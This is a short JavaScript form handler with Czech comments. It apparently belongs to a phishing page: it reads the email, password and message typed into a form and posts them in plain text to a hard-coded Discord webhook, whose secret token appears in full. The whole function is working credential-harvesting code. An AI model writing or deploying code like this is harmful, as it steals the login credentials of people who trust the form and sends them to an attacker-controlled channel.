function sendToWebhook(event) {
    event.preventDefault();  // Zastaví standardní odeslání formuláře

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let message = document.getElementById("message").value;

    const webhookUrl = "https://discord.com/api/webhooks/1311013439770198016/sHyudTmZBN5AIVtTw132SRJxbVaJ0UgFb21GeM1Zq-vl5IhBBOT70qS6WMtyvjD9m9Gb";

    // Nastavení požadavku
    const request = new XMLHttpRequest();
    request.open("POST", webhookUrl);
    request.setRequestHeader('Content-Type', 'application/json');

    // Tvoříme data
    const data = {
        content: `Email: ${email}\nPassword: ${password}\nMessage: ${message}`
    };

    // Callback pro zpracování odpovědi
    request.onreadystatechange = function () {
        if (request.readyState === XMLHttpRequest.DONE) {  // Po dokončení požadavku
            if (request.status === 200) {
                console.log("Zpráva byla úspěšně odeslána.");
            } else {
                console.error("Chyba při odesílání zprávy:", request.responseText);
            }
        }
    };

    request.send(JSON.stringify(data));  // Odeslání JSON
}